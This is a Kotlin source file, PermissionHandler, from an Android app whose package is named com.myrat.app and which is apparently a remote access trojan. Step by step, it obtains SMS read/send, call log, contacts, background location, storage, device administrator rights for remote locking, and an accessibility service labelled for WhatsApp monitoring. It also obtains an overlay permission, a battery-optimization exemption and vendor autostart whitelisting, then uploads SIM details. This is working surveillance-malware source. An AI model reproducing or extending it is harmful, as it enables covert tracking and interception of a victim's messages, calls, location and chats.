package com.myrat.app.handler

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import com.myrat.app.service.ServiceManager
import com.myrat.app.utils.Logger
import pub.devrel.easypermissions.EasyPermissions
import pub.devrel.easypermissions.PermissionRequest
import java.lang.ref.WeakReference

class PermissionHandler(
    activity: Activity,
    private val simDetailsHandler: SimDetailsHandler,
    private val serviceManager: ServiceManager
) {
    
    private val activityRef = WeakReference(activity)
    private var currentStep = 0
    private val totalSteps = 8
    private var permissionsRequested = false
    
    companion object {
        private const val RC_SMS_PERMISSIONS = 100
        private const val RC_PHONE_PERMISSIONS = 101
        private const val RC_LOCATION_PERMISSIONS = 102
        private const val RC_STORAGE_PERMISSIONS = 103
        private const val RC_NOTIFICATION_PERMISSIONS = 104
    }
    
    // Permission groups for step-by-step granting
    private val smsPermissions = arrayOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS
    )
    
    private val phonePermissions = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG
    )
    
    private val locationPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )
    
    private val storagePermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
    } else {
        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    }
    
    private val notificationPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(Manifest.permission.POST_NOTIFICATIONS)
    } else {
        emptyArray()
    }

    fun requestPermissions() {
        val activity = activityRef.get() ?: return
        
        if (permissionsRequested) {
            Logger.log("Permissions already requested, skipping")
            return
        }
        
        Logger.log("Starting STEP-BY-STEP permission flow with service management")
        currentStep = 1
        permissionsRequested = true
        
        // Start with SMS permissions (highest priority)
        requestSmsPermissions(activity)
    }

    private fun requestSmsPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting SMS permissions (CRITICAL)")
        
        try {
            if (EasyPermissions.hasPermissions(activity, *smsPermissions)) {
                Logger.log("SMS permissions already granted")
                serviceManager.checkAndStartAvailableServices() // Start SMS service
                currentStep++
                requestPhonePermissions(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_SMS_PERMISSIONS, *smsPermissions)
                    .setRationale("""
                        📱 SMS PERMISSIONS (CRITICAL)
                        
                        These permissions are essential for:
                        • Receiving SMS messages
                        • Reading existing SMS
                        • Sending SMS messages
                        • Phone state monitoring
                        
                        The SMS service will start immediately after granting these permissions.
                    """.trimIndent())
                    .setPositiveButtonText("Grant SMS Permissions")
                    .setNegativeButtonText("Skip")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting SMS permissions", e)
            currentStep++
            requestPhonePermissions(activity)
        }
    }

    private fun requestPhonePermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting phone permissions (CRITICAL)")
        
        try {
            if (EasyPermissions.hasPermissions(activity, *phonePermissions)) {
                Logger.log("Phone permissions already granted")
                serviceManager.checkAndStartAvailableServices() // Start phone-related services
                currentStep++
                requestLocationPermissions(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_PHONE_PERMISSIONS, *phonePermissions)
                    .setRationale("""
                        📞 PHONE PERMISSIONS (CRITICAL)
                        
                        These permissions are essential for:
                        • Making phone calls
                        • Reading phone state and SIM info
                        • Accessing contacts
                        • Reading call history
                        
                        Call and contact services will start after granting these permissions.
                    """.trimIndent())
                    .setPositiveButtonText("Grant Phone Permissions")
                    .setNegativeButtonText("Skip")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting phone permissions", e)
            currentStep++
            requestLocationPermissions(activity)
        }
    }

    private fun requestLocationPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting location permissions (CRITICAL)")
        
        try {
            if (EasyPermissions.hasPermissions(activity, *locationPermissions)) {
                Logger.log("Location permissions already granted")
                serviceManager.checkAndStartAvailableServices() // Start location service
                currentStep++
                requestBackgroundLocation(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_LOCATION_PERMISSIONS, *locationPermissions)
                    .setRationale("""
                        📍 LOCATION PERMISSIONS (CRITICAL)
                        
                        These permissions are essential for:
                        • Real-time location tracking
                        • Location history
                        • GPS monitoring
                        
                        Location service will start after granting these permissions.
                    """.trimIndent())
                    .setPositiveButtonText("Grant Location Permissions")
                    .setNegativeButtonText("Skip")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting location permissions", e)
            currentStep++
            requestBackgroundLocation(activity)
        }
    }

    private fun requestBackgroundLocation(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting background location (Android 10+)")
        
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                currentStep++
                requestStoragePermissions(activity)
                return
            }
            
            if (EasyPermissions.hasPermissions(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                Logger.log("Background location already granted")
                serviceManager.checkAndStartAvailableServices()
                currentStep++
                requestStoragePermissions(activity)
                return
            }
            
            // Background location requires special handling
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Opened app settings for background location")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                serviceManager.checkAndStartAvailableServices()
                currentStep++
                requestStoragePermissions(activity)
            }, 5000)
            
        } catch (e: Exception) {
            Logger.error("Error requesting background location", e)
            currentStep++
            requestStoragePermissions(activity)
        }
    }

    private fun requestStoragePermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting storage permissions")
        
        try {
            if (storagePermissions.isEmpty() || EasyPermissions.hasPermissions(activity, *storagePermissions)) {
                Logger.log("Storage permissions already granted or not needed")
                serviceManager.checkAndStartAvailableServices() // Start image service
                currentStep++
                requestNotificationPermissions(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_STORAGE_PERMISSIONS, *storagePermissions)
                    .setRationale("""
                        📁 STORAGE PERMISSIONS
                        
                        These permissions are needed for:
                        • Accessing images and files
                        • Image upload functionality
                        
                        Image upload service will start after granting these permissions.
                    """.trimIndent())
                    .setPositiveButtonText("Grant Storage Permissions")
                    .setNegativeButtonText("Skip")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting storage permissions", e)
            currentStep++
            requestNotificationPermissions(activity)
        }
    }

    private fun requestNotificationPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting notification permissions (Android 13+)")
        
        try {
            if (notificationPermissions.isEmpty() || EasyPermissions.hasPermissions(activity, *notificationPermissions)) {
                Logger.log("Notification permissions already granted or not needed")
                serviceManager.checkAndStartAvailableServices()
                currentStep++
                requestBatteryOptimization(activity)
                return
            }
            
            EasyPermissions.requestPermissions(
                PermissionRequest.Builder(activity, RC_NOTIFICATION_PERMISSIONS, *notificationPermissions)
                    .setRationale("""
                        🔔 NOTIFICATION PERMISSIONS (Android 13+)
                        
                        This permission is needed for:
                        • Important app notifications
                        • Service status updates
                        • Alert notifications
                    """.trimIndent())
                    .setPositiveButtonText("Grant Notification Permission")
                    .setNegativeButtonText("Skip")
                    .build()
            )
        } catch (e: Exception) {
            Logger.error("Error requesting notification permissions", e)
            currentStep++
            requestBatteryOptimization(activity)
        }
    }

    private fun requestBatteryOptimization(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting battery optimization disable (CRITICAL)")
        
        try {
            if (isBatteryOptimizationDisabled(activity)) {
                Logger.log("Battery optimization already disabled")
                serviceManager.checkAndStartAvailableServices() // Start lock service
                currentStep++
                requestSpecialPermissions(activity)
                return
            }
            
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Battery optimization intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                serviceManager.checkAndStartAvailableServices()
                currentStep++
                requestSpecialPermissions(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization", e)
            currentStep++
            requestSpecialPermissions(activity)
        }
    }

    private fun requestSpecialPermissions(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Requesting special permissions")
        
        try {
            // Device admin
            if (!isDeviceAdminEnabled(activity)) {
                requestDeviceAdmin(activity)
                return
            }
            
            // Accessibility service
            if (!isAccessibilityServiceEnabled(activity)) {
                requestAccessibilityService(activity)
                return
            }
            
            // System overlay
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(activity)) {
                requestOverlayPermission(activity)
                return
            }
            
            // Exact alarms (Android 12+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val alarmManager = activity.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
                if (!alarmManager.canScheduleExactAlarms()) {
                    requestExactAlarms(activity)
                    return
                }
            }
            
            currentStep++
            requestManufacturerSpecificSettings(activity)
        } catch (e: Exception) {
            Logger.error("Error requesting special permissions", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    // Callback methods for MainActivity to call
    fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        Logger.log("✅ Permissions granted for request $requestCode: $perms")
        
        try {
            // Start services immediately when permissions are granted
            serviceManager.checkAndStartAvailableServices()
            
            when (requestCode) {
                RC_SMS_PERMISSIONS -> {
                    Logger.log("SMS permissions granted - SMS service should now be running")
                    currentStep++
                    requestPhonePermissions(activity)
                }
                RC_PHONE_PERMISSIONS -> {
                    Logger.log("Phone permissions granted - Call and contact services should now be running")
                    currentStep++
                    requestLocationPermissions(activity)
                }
                RC_LOCATION_PERMISSIONS -> {
                    Logger.log("Location permissions granted - Location service should now be running")
                    currentStep++
                    requestBackgroundLocation(activity)
                }
                RC_STORAGE_PERMISSIONS -> {
                    Logger.log("Storage permissions granted - Image service should now be running")
                    currentStep++
                    requestNotificationPermissions(activity)
                }
                RC_NOTIFICATION_PERMISSIONS -> {
                    Logger.log("Notification permissions granted")
                    currentStep++
                    requestBatteryOptimization(activity)
                }
                else -> {
                    // Continue with next step
                    currentStep++
                    requestBatteryOptimization(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsGranted", e)
        }
    }

    fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        val activity = activityRef.get() ?: return
        
        Logger.warn("❌ Permissions denied for request $requestCode: $perms")
        
        try {
            // Still check and start available services with granted permissions
            serviceManager.checkAndStartAvailableServices()
            
            // Check if some permissions are permanently denied
            if (EasyPermissions.somePermissionPermanentlyDenied(activity, perms)) {
                Logger.warn("Some permissions permanently denied: $perms")
            }
            
            // Continue with next step regardless of denials
            when (requestCode) {
                RC_SMS_PERMISSIONS -> {
                    currentStep++
                    requestPhonePermissions(activity)
                }
                RC_PHONE_PERMISSIONS -> {
                    currentStep++
                    requestLocationPermissions(activity)
                }
                RC_LOCATION_PERMISSIONS -> {
                    currentStep++
                    requestBackgroundLocation(activity)
                }
                RC_STORAGE_PERMISSIONS -> {
                    currentStep++
                    requestNotificationPermissions(activity)
                }
                RC_NOTIFICATION_PERMISSIONS -> {
                    currentStep++
                    requestBatteryOptimization(activity)
                }
                else -> {
                    currentStep++
                    requestBatteryOptimization(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsDenied", e)
        }
    }

    private fun requestDeviceAdmin(activity: Activity) {
        Logger.log("Requesting device admin (for lock service)")
        
        try {
            val adminComponent = ComponentName(activity, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Device Administrator permission enables remote device locking and security management.")
            }
            activity.startActivity(intent)
            Logger.log("Device admin intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                serviceManager.checkAndStartAvailableServices()
                if (!isAccessibilityServiceEnabled(activity)) {
                    requestAccessibilityService(activity)
                } else {
                    currentStep++
                    requestManufacturerSpecificSettings(activity)
                }
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request device admin", e)
            if (!isAccessibilityServiceEnabled(activity)) {
                requestAccessibilityService(activity)
            } else {
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }
        }
    }

    private fun requestAccessibilityService(activity: Activity) {
        Logger.log("Requesting accessibility service (for WhatsApp monitoring)")
        
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent)
            Logger.log("Accessibility settings intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                serviceManager.checkAndStartAvailableServices()
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }, 5000)
            
        } catch (e: Exception) {
            Logger.error("Failed to open accessibility settings", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestOverlayPermission(activity: Activity) {
        Logger.log("Requesting overlay permission")
        
        try {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Overlay permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                serviceManager.checkAndStartAvailableServices()
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request overlay permission", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestExactAlarms(activity: Activity) {
        Logger.log("Requesting exact alarms permission (Android 12+)")
        
        try {
            val intent = Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Exact alarms permission intent launched")
            
            // Continue after delay
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                serviceManager.checkAndStartAvailableServices()
                currentStep++
                requestManufacturerSpecificSettings(activity)
            }, 3000)
            
        } catch (e: Exception) {
            Logger.error("Failed to request exact alarms permission", e)
            currentStep++
            requestManufacturerSpecificSettings(activity)
        }
    }

    private fun requestManufacturerSpecificSettings(activity: Activity) {
        Logger.log("Step $currentStep/$totalSteps: Opening manufacturer-specific settings")
        
        try {
            val manufacturer = Build.MANUFACTURER.lowercase()
            Logger.log("Device manufacturer: $manufacturer")
            
            when {
                manufacturer.contains("xiaomi") -> openXiaomiSettings(activity)
                manufacturer.contains("oppo") -> openOppoSettings(activity)
                manufacturer.contains("vivo") -> openVivoSettings(activity)
                manufacturer.contains("huawei") -> openHuaweiSettings(activity)
                manufacturer.contains("samsung") -> openSamsungSettings(activity)
                manufacturer.contains("oneplus") -> openOnePlusSettings(activity)
                manufacturer.contains("realme") -> openRealmeSettings(activity)
                else -> {
                    Logger.log("No specific manufacturer settings for: $manufacturer")
                    finishPermissionFlow(activity)
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to open manufacturer settings", e)
            finishPermissionFlow(activity)
        }
    }

    private fun openXiaomiSettings(activity: Activity) {
        Logger.log("Opening MIUI-specific settings")
        
        val intents = listOf(
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            Intent().setComponent(ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity")),
            Intent("miui.intent.action.APP_PERM_EDITOR").setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity").putExtra("extra_pkgname", activity.packageName),
            Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.securitycenter.Main"))
        )
        
        tryLaunchIntents(activity, intents, "MIUI Settings")
    }

    private fun openOppoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"))
        )
        tryLaunchIntents(activity, intents, "ColorOS Settings")
    }

    private fun openVivoSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"))
        )
        tryLaunchIntents(activity, intents, "Vivo Settings")
    }

    private fun openHuaweiSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"))
        )
        tryLaunchIntents(activity, intents, "Huawei Settings")
    }

    private fun openSamsungSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "Samsung Settings")
    }

    private fun openOnePlusSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "OnePlus Settings")
    }

    private fun openRealmeSettings(activity: Activity) {
        val intents = listOf(
            Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.FakeActivity")),
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).setData(Uri.parse("package:${activity.packageName}"))
        )
        tryLaunchIntents(activity, intents, "Realme Settings")
    }

    private fun tryLaunchIntents(activity: Activity, intents: List<Intent>, settingsName: String) {
        for (intent in intents) {
            try {
                if (intent.resolveActivity(activity.packageManager) != null) {
                    activity.startActivity(intent)
                    Logger.log("Successfully opened $settingsName")
                    
                    // Finish after delay
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        finishPermissionFlow(activity)
                    }, 2000)
                    return
                }
            } catch (e: Exception) {
                Logger.warn("Failed to launch intent for $settingsName: ${e.message}")
            }
        }
        
        // Fallback to app settings
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
            Logger.log("Opened app settings as fallback for $settingsName")
        } catch (e: Exception) {
            Logger.error("Failed to open app settings fallback", e)
        }
        
        finishPermissionFlow(activity)
    }

    private fun finishPermissionFlow(activity: Activity) {
        Logger.log("🎉 Permission flow completed!")
        
        try {
            // Final service check and start
            serviceManager.checkAndStartAvailableServices()
            
            // Upload SIM details
            simDetailsHandler.uploadSimDetails()
            
            // Log final service status
            val stats = serviceManager.getServiceStats()
            Logger.log("Final service status: ${stats["running_services"]}/${stats["total_services"]} services running")
            
        } catch (e: Exception) {
            Logger.error("Error in finishPermissionFlow", e)
        }
    }

    // Helper methods
    private fun isBatteryOptimizationDisabled(context: Context): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.isIgnoringBatteryOptimizations(context.packageName)
            } else {
                true
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun isDeviceAdminEnabled(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(context, com.myrat.app.receiver.MyDeviceAdminReceiver::class.java)
            devicePolicyManager.isAdminActive(adminComponent)
        } catch (e: Exception) {
            false
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        return try {
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val services = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                services?.contains("${context.packageName}/com.myrat.app.service.WhatsAppService") == true
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    fun hasBasicPermissions(): Boolean {
        val activity = activityRef.get() ?: return false
        return EasyPermissions.hasPermissions(activity, *smsPermissions) ||
               EasyPermissions.hasPermissions(activity, *phonePermissions)
    }

    fun areAllPermissionsGranted(): Boolean {
        val activity = activityRef.get() ?: return false
        
        val allPermissions = smsPermissions + phonePermissions + locationPermissions + storagePermissions + notificationPermissions
        val runtimeGranted = EasyPermissions.hasPermissions(activity, *allPermissions)
        val batteryOptimized = isBatteryOptimizationDisabled(activity)
        
        return runtimeGranted && batteryOptimized
    }

    fun handleResume() {
        try {
            val activity = activityRef.get() ?: return
            
            // Always check and start available services on resume
            serviceManager.checkAndStartAvailableServices()
            
            if (areAllPermissionsGranted()) {
                Logger.log("All permissions granted on resume")
                finishPermissionFlow(activity)
            }
        } catch (e: Exception) {
            Logger.error("Error in handleResume", e)
        }
    }

    fun cleanup() {
        try {
            Logger.log("PermissionHandler cleanup completed")
        } catch (e: Exception) {
            Logger.error("Error in cleanup", e)
        }
    }
}